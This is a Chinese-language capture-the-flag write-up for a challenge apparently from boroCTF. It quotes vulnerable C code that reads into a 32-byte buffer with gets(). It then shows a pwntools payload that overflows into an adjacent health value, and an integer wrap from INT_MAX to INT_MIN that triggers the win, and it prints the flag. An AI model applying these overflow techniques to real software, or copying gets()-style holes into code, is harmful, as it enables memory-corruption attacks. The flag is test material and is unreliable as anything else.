# Jin Sakai

## 題目描述

The Eagle's curse has completely made him go mad...

Once a hero of Tshushima, now a bloodthirsty warrior.

Please put an end to this madness.

```text
nc w4owkcjzvv0e.boroctf.com 53217
```

## 解題思路

1. **第一步**：

    先看 boss.c：

    ```c
    struct GameState {
        char buffer[32];
        int samurai_hp;
    };

    void fight_phase1() {
        struct GameState state;
        state.samurai_hp = 999;

        gets(state.buffer);

        if (state.samurai_hp <= 0) {
            printf("TRANSITION|\n");
        } else {
            printf("DIE|\n");
            exit(0);
        }
    }
    ```

    buffer 只有 32 bytes，但是用了 gets()，所以可以 overflow 到後面的 samurai_hp：

    ```python
    p.sendline(b"A" * 32 + p32(0))
    ```

2. **第二步**：

    進到第二階段，boss血量變成：

    ```c
    int samurai_hp = INT_MAX;
    ```

    就是 2147483647，同時觀察 win 的條件：

    ```c
    if (samurai_hp == INT_MIN) {
        printf("WIN|\n");
        // print flag
    }
    ```

    所以只要想辦法 overflow 成 INT_MIN 就可以了。

    此時只要對 INT_MAX + 1 就會 overflow 成 INT_MIN，所以執行以下操作：

    ```text
    Use Item
    Health Potion
    Target The Beast
    amount = 1
    ```

    就可以拿到 flag 了。

## Flag

```text
boroCTF{gh0st_0f_3xpl01t4t10n}
```
